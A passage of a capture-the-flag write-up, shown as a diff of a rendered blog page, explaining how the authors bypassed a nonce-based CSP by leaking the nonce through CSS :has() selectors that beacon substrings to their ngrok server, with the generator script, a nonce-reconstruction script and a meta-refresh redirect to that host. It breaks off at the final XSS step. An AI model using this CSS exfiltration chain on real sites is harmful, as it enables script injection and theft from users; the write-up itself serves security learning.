+</span></span><span class=line><span class=cl>    <span class=na>content</span><span class=o>=</span><span class=s>&#34;script-src &#39;nonce-&lt;%= nonce %&gt;&#39;; frame-src &#39;none&#39;; object-src &#39;none&#39;; base-uri &#39;self&#39;; style-src &#39;unsafe-inline&#39; https://unpkg.com&#34;</span><span class=p>&gt;</span>
+</span></span></code></pre></div><p>So we can&rsquo;t execute any js code as long as they don&rsquo;t have the right nonce, which is generated randomly and it changes every time we make a request. We can see how the nonce is generated in <code>app.js</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>genNonce</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;_&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=nx>repeat</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/_/g</span><span class=p>,</span> <span class=p>()</span> <span class=p>=&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=s2>&#34;abcdefghijklmnopqrstuvwxyz0123456789&#34;</span><span class=p>.</span><span class=nx>charAt</span><span class=p>(</span><span class=nx>crypto</span><span class=p>.</span><span class=nx>randomInt</span><span class=p>(</span><span class=mi>36</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=p>);</span>
+</span></span></code></pre></div><p>Thus, we have <code>36^32</code> possible nonces, which is a lot. We can&rsquo;t bruteforce it, so we need to find another way.</p><p>However, due to the <code>unsafe-inline</code> CSP policy, we&rsquo;re able to insert CSS by using the <code>&lt;style></code> tag and by uploading to <code>npm</code> (the files are taken by <code>unpkg.com</code>)</p><p>By doing a quick research it&rsquo;s clear that we need to steal the nonce using CSS.</p><p><strong>Note:</strong> It&rsquo;s possible to leak the nonce using CSS because it&rsquo;s inside a meta tag, otherwise it wouldn&rsquo;t be possibile.</p><h2 id=exploit-idea><a class=full-clickable-heading href=#exploit-idea>Exploit idea</a></h2><p>The exploit would be something similar to:</p><ol><li>Upload to <code>npm</code> a css file <code>leak.css</code> whose content is the exploit which will leak the nonce (I&rsquo;m going to talk about this later).</li><li>Create a post (ID 0) with a <code>meta</code> tag, which is needed to redirect the admin to an HTML page controlled by us.</li><li>Create a post (ID 1) where we import the <code>leak.css</code> and where the nonce will be stolen.</li><li>Report the meta redirect post (ID 0) to the admin, so he will be redirected to our page, where we can make him load the post where the <code>leak.css</code> style is imported (ID 1)</li><li>Finally, on the fly, when we have leaked the nonce, we create the last post (ID 2) where we can execute arbitrary js code with a nonce script, we can make the bot load the post (ID 2) where the XSS is executed, by changing the hash part of the url.</li><li>Profit.</li></ol><p>Main issue is, though, to understand how to leak the nonce.</p><h2 id=leaking-the-nonce><a class=full-clickable-heading href=#leaking-the-nonce>Leaking the nonce</a></h2><p>The first idea that came into our mind is using the following css rules in order to leak the nonce:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-css data-lang=css><span class=line><span class=cl><span class=nt>body</span><span class=p>:</span><span class=nd>has</span><span class=o>(</span><span class=nt>script</span><span class=o>[</span><span class=nt>nonce</span><span class=o>^=</span><span class=s2>&#34;a&#34;</span><span class=o>])</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>background</span><span class=p>:</span> <span class=nb>url</span><span class=p>(</span><span class=sx>...</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nt>body</span><span class=p>:</span><span class=nd>has</span><span class=o>(</span><span class=nt>script</span><span class=o>[</span><span class=nt>nonce</span><span class=o>^=</span><span class=s2>&#34;b&#34;</span><span class=o>])</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>background</span><span class=p>:</span> <span class=nb>url</span><span class=p>(</span><span class=sx>...</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nt>body</span><span class=p>:</span><span class=nd>has</span><span class=o>(</span><span class=nt>script</span><span class=o>[</span><span class=nt>nonce</span><span class=o>^=</span><span class=s2>&#34;c&#34;</span><span class=o>])</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>background</span><span class=p>:</span> <span class=nb>url</span><span class=p>(</span><span class=sx>...</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[...]</span>
+</span></span></code></pre></div><p>When a request is sent to our server, we know which char is right, and then we would upload a new css file to npm in order to leak the following char.</p><p>We quickly realized it&rsquo;s not possible due to multiple reasons:</p><ul><li>the uploading process is too slow,</li><li>we cannot import dynamically css since we cannot reload the page, leading to losing the nonce</li><li>we can only load another post once.</li></ul><p>so we moved on.</p><p>An idea which sounded great came into my mind the next day: we can leak the whole nonce in parts by using the <code>*=</code> operator in CSS.</p><p>Example:
+Let&rsquo;s say our nonce is <code>testo</code>, if we can leak substrings of the nonce, then to our server we might receive these requests:</p><p><code>?x=tes</code>
 <code>?x=est</code>
-<code>?x=sto</code></p>
-<p>Then, since some letters overlap, we&rsquo;re able to recover the whole nonce.</p>
-<p>We tried to leak some characters using a payload similar to the one above:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="nt">body</span><span class="p">:</span><span class="nd">has</span><span class="o">(</span><span class="nt">script</span><span class="o">[</span><span class="nt">nonce</span><span class="o">*=</span><span class="s2">&#34;aaa&#34;</span><span class="o">])</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="sx">...</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nt">body</span><span class="p">:</span><span class="nd">has</span><span class="o">(</span><span class="nt">script</span><span class="o">[</span><span class="nt">nonce</span><span class="o">*=</span><span class="s2">&#34;aab&#34;</span><span class="o">])</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="sx">...</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nt">body</span><span class="p">:</span><span class="nd">has</span><span class="o">(</span><span class="nt">script</span><span class="o">[</span><span class="nt">nonce</span><span class="o">*=</span><span class="s2">&#34;aac&#34;</span><span class="o">])</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="sx">...</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[...]</span>
-</span></span></code></pre></div><p>We realized that something is not working, only the last matched substring (in this case it would be <code>aac</code>) is being sent to our server.</p>
-<p>We had no idea why it didn&rsquo;t work.</p>
-<blockquote>
-<p>Further researches led us to understand that in CSS, when you have multiple selectors targeting the same element (or set of elements) with conflicting styles, the style that is applied is determined by the specificity and order of the rules. If a later rule has the same or higher specificity as an earlier rule, it will override the earlier rule. If the specificity is the same, the rule declared later in the stylesheet takes precedence.</p>
-</blockquote>
-<p>Then, after trying many times to find a way to send more requests, we tried to apply more than one background to a tag and&hellip; It worked!!!</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="p">:</span><span class="nd">has</span><span class="o">(</span><span class="nt">script</span><span class="o">[</span><span class="nt">nonce</span><span class="o">*=</span><span class="s2">&#34;aaa&#34;</span><span class="o">])</span><span class="p">{</span><span class="nv">--tosend-aaa</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="sx">...?x=aaa</span><span class="p">);}</span>
-</span></span><span class="line"><span class="cl"><span class="p">:</span><span class="nd">has</span><span class="o">(</span><span class="nt">script</span><span class="o">[</span><span class="nt">nonce</span><span class="o">*=</span><span class="s2">&#34;aab&#34;</span><span class="o">])</span><span class="p">{</span><span class="nv">--tosend-aab</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="sx">...?x=aab</span><span class="p">);}</span>
-</span></span><span class="line"><span class="cl"><span class="p">:</span><span class="nd">has</span><span class="o">(</span><span class="nt">script</span><span class="o">[</span><span class="nt">nonce</span><span class="o">*=</span><span class="s2">&#34;aac&#34;</span><span class="o">])</span><span class="p">{</span><span class="nv">--tosend-aac</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="sx">...?x=aac</span><span class="p">);}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[...]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nt">input</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">background</span><span class="p">:</span> <span class="nf">var</span><span class="p">(</span><span class="o">--</span><span class="n">tosend</span><span class="o">-</span><span class="n">aaa</span><span class="p">,</span> <span class="kc">none</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">var</span><span class="p">(</span><span class="o">--</span><span class="n">tosend</span><span class="o">-</span><span class="n">aab</span><span class="p">,</span> <span class="kc">none</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">var</span><span class="p">(</span><span class="o">--</span><span class="n">tosend</span><span class="o">-</span><span class="n">aac</span><span class="p">,</span> <span class="kc">none</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">var</span><span class="p">(</span><span class="o">--</span><span class="n">tosend</span><span class="o">-</span><span class="n">aad</span><span class="p">,</span> <span class="kc">none</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="o">...</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+<code>?x=sto</code></p><p>Then, since some letters overlap, we&rsquo;re able to recover the whole nonce.</p><p>We tried to leak some characters using a payload similar to the one above:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-css data-lang=css><span class=line><span class=cl><span class=nt>body</span><span class=p>:</span><span class=nd>has</span><span class=o>(</span><span class=nt>script</span><span class=o>[</span><span class=nt>nonce</span><span class=o>*=</span><span class=s2>&#34;aaa&#34;</span><span class=o>])</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>background</span><span class=p>:</span> <span class=nb>url</span><span class=p>(</span><span class=sx>...</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nt>body</span><span class=p>:</span><span class=nd>has</span><span class=o>(</span><span class=nt>script</span><span class=o>[</span><span class=nt>nonce</span><span class=o>*=</span><span class=s2>&#34;aab&#34;</span><span class=o>])</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>background</span><span class=p>:</span> <span class=nb>url</span><span class=p>(</span><span class=sx>...</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nt>body</span><span class=p>:</span><span class=nd>has</span><span class=o>(</span><span class=nt>script</span><span class=o>[</span><span class=nt>nonce</span><span class=o>*=</span><span class=s2>&#34;aac&#34;</span><span class=o>])</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>background</span><span class=p>:</span> <span class=nb>url</span><span class=p>(</span><span class=sx>...</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[...]</span>
+</span></span></code></pre></div><p>We realized that something is not working, only the last matched substring (in this case it would be <code>aac</code>) is being sent to our server.</p><p>We had no idea why it didn&rsquo;t work.</p><blockquote><p>Further researches led us to understand that in CSS, when you have multiple selectors targeting the same element (or set of elements) with conflicting styles, the style that is applied is determined by the specificity and order of the rules. If a later rule has the same or higher specificity as an earlier rule, it will override the earlier rule. If the specificity is the same, the rule declared later in the stylesheet takes precedence.</p></blockquote><p>Then, after trying many times to find a way to send more requests, we tried to apply more than one background to a tag and&mldr; It worked!!!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-css data-lang=css><span class=line><span class=cl><span class=p>:</span><span class=nd>has</span><span class=o>(</span><span class=nt>script</span><span class=o>[</span><span class=nt>nonce</span><span class=o>*=</span><span class=s2>&#34;aaa&#34;</span><span class=o>])</span><span class=p>{</span><span class=nv>--tosend-aaa</span><span class=p>:</span> <span class=nb>url</span><span class=p>(</span><span class=sx>...?x=aaa</span><span class=p>);}</span>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nd>has</span><span class=o>(</span><span class=nt>script</span><span class=o>[</span><span class=nt>nonce</span><span class=o>*=</span><span class=s2>&#34;aab&#34;</span><span class=o>])</span><span class=p>{</span><span class=nv>--tosend-aab</span><span class=p>:</span> <span class=nb>url</span><span class=p>(</span><span class=sx>...?x=aab</span><span class=p>);}</span>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nd>has</span><span class=o>(</span><span class=nt>script</span><span class=o>[</span><span class=nt>nonce</span><span class=o>*=</span><span class=s2>&#34;aac&#34;</span><span class=o>])</span><span class=p>{</span><span class=nv>--tosend-aac</span><span class=p>:</span> <span class=nb>url</span><span class=p>(</span><span class=sx>...?x=aac</span><span class=p>);}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[...]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nt>input</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>background</span><span class=p>:</span> <span class=nf>var</span><span class=p>(</span><span class=o>--</span><span class=n>tosend</span><span class=o>-</span><span class=n>aaa</span><span class=p>,</span> <span class=kc>none</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=nf>var</span><span class=p>(</span><span class=o>--</span><span class=n>tosend</span><span class=o>-</span><span class=n>aab</span><span class=p>,</span> <span class=kc>none</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=nf>var</span><span class=p>(</span><span class=o>--</span><span class=n>tosend</span><span class=o>-</span><span class=n>aac</span><span class=p>,</span> <span class=kc>none</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=nf>var</span><span class=p>(</span><span class=o>--</span><span class=n>tosend</span><span class=o>-</span><span class=n>aad</span><span class=p>,</span> <span class=kc>none</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=o>...</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
 </span></span></code></pre></div><p>So we&rsquo;re going to receive only the correct substrings.
-It&rsquo;s possible to recover the nonce in many ways, the one we used is the following:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">retrieveNonce</span><span class="p">(</span><span class="n">nonce_substr</span><span class="o">=</span><span class="n">nonce_substr</span><span class="p">,</span> <span class="n">force</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="c1"># find the beginning of the nonce (there is no match for start)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">new_substr</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">nonce_substr</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">new_substr</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">30</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">force</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;different length of new_substr [</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">new_substr</span><span class="p">)</span><span class="si">}</span><span class="s2">] - aborting&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl">    <span class="n">backup</span> <span class="o">=</span> <span class="p">[]</span>
-</span></span><span class="line"><span class="cl">    <span class="n">nonce</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">remove_i</span> <span class="o">=</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">new_substr</span><span class="p">)):</span>
-</span></span><span class="line"><span class="cl">        <span class="n">start_i</span> <span class="o">=</span> <span class="n">new_substr</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">        <span class="n">left</span> <span class="o">=</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">new_substr</span><span class="p">)):</span>
-</span></span><span class="line"><span class="cl">            <span class="n">end_j</span> <span class="o">=</span> <span class="n">new_substr</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="o">-</span><span class="mi">2</span><span class="p">:]</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">i</span> <span class="o">!=</span> <span class="n">j</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">start_i</span> <span class="o">==</span> <span class="n">end_j</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">left</span> <span class="o">=</span> <span class="mi">1</span>
-</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">left</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="c1"># beginning</span>
-</span></span><span class="line"><span class="cl">            <span class="n">remove_i</span> <span class="o">=</span> <span class="n">i</span>
-</span></span><span class="line"><span class="cl">            <span class="n">nonce</span> <span class="o">=</span> <span class="n">new_substr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">            <span class="k">break</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">nonce</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;no beginning - aborting&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">nonce</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="n">new_substr</span> <span class="o">=</span> <span class="n">new_substr</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">remove_i</span><span class="p">]</span> <span class="o">+</span> <span class="n">new_substr</span><span class="p">[</span><span class="n">remove_i</span><span class="o">+</span><span class="mi">1</span><span class="p">:]</span>
-</span></span><span class="line"><span class="cl">        <span class="c1"># print(&#34;new substr: &#34; + str(new_substr))</span>
-</span></span><span class="line"><span class="cl">        <span class="n">found</span> <span class="o">=</span> <span class="p">[]</span>
-</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">new_substr</span><span class="p">)):</span>
-</span></span><span class="line"><span class="cl">            <span class="n">start_i</span> <span class="o">=</span> <span class="n">new_substr</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">nonce</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">:]</span> <span class="o">==</span> <span class="n">start_i</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">                <span class="c1"># print(&#34;found: &#34; + start_i)</span>
-</span></span><span class="line"><span class="cl">                <span class="n">found</span> <span class="o">+=</span> <span class="p">[</span><span class="n">i</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">found</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">            <span class="c1"># start over from latest backup</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">backup</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">                <span class="n">nonce</span> <span class="o">=</span> <span class="n">backup</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">                <span class="n">found</span> <span class="o">=</span> <span class="n">backup</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">                <span class="n">new_substr</span> <span class="o">=</span> <span class="n">backup</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">                <span class="n">backup</span> <span class="o">=</span> <span class="n">backup</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;no backup - aborting&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                <span class="k">break</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">found</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">found</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;found more than one: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">found</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">                <span class="n">backup</span> <span class="o">+=</span> <span class="p">[[</span><span class="n">nonce</span><span class="p">,</span> <span class="n">found</span><span class="p">[</span><span class="mi">1</span><span class="p">:],</span> <span class="n">new_substr</span><span class="p">]]</span>
-</span></span><span class="line"><span class="cl">            <span class="n">remove_i</span> <span class="o">=</span> <span class="n">found</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">            <span class="n">nonce</span> <span class="o">+=</span> <span class="n">new_substr</span><span class="p">[</span><span class="n">remove_i</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="c1"># input(&#34;nonce: &#34; + nonce)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">nonce</span>
-</span></span></code></pre></div><p>We noticed that the tab crashes while loading that css, but the requests are sent to our server anyway.</p>
-
-<h2 id="sources">
-  <a class="full-clickable-heading" href="#sources">
-    Sources
-  </a>
-</h2>
-
-<h3 id="css-exploit">
-  <a class="full-clickable-heading" href="#css-exploit">
-    CSS exploit
-  </a>
-</h3>
-<p>This is the script used in order to generate the CSS file:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">itertools</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">charset</span> <span class="o">=</span> <span class="s2">&#34;abcdefghijklmnopqrstuvwxyz0123456789&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">perms</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">,</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">charset</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">3</span><span class="p">)))</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;leak.css&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">perms</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;&#34;&#34;:has(script[nonce*=&#34;</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s2">&#34;])</span><span class="se">{{</span><span class="s2">--tosend-</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s2">: url(https://25de-37-160-34-111.ngrok-free.app/?x=</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s2">);</span><span class="se">}}</span><span class="s2">&#34;&#34;&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;loading&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">perms</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&#34;var(--tosend-</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s2">, none),&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;done&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;writing&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">((</span><span class="s2">&#34;&#34;&#34;
-</span></span></span><span class="line"><span class="cl"><span class="s2">input{
-</span></span></span><span class="line"><span class="cl"><span class="s2">background: </span><span class="si">%s</span><span class="s2">
-</span></span></span><span class="line"><span class="cl"><span class="s2">}
-</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span> <span class="o">%</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
-</span></span></code></pre></div>
-<h3 id="first-note-id-0">
-  <a class="full-clickable-heading" href="#first-note-id-0">
-    First note (ID 0)
-  </a>
-</h3>
-<p>Meta tag redirect</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;refresh&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;0.0;url=https://25de-37-160-34-111.ngrok-free.app/&#34;</span><span class="p">&gt;</span>
-</span></span></code></pre></div>
-<h3 id="second-note-id-1">
-  <a class="full-clickable-heading" href="#second-note-id-1">
-    Second Note (ID 1)
-  </a>
-</h3>
-<p>Nonce leak</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://unpkg.com/alemmi@x.x.x/leak.css&#34;</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="p">/&gt;</span>
-</span></span></code></pre></div>
-<h3 id="third-note-id-2">
-  <a class="full-clickable-heading" href="#third-note-id-2">
-    Third Note (ID 2)
-  </a>
-</h3>
-<p>XSS</p>
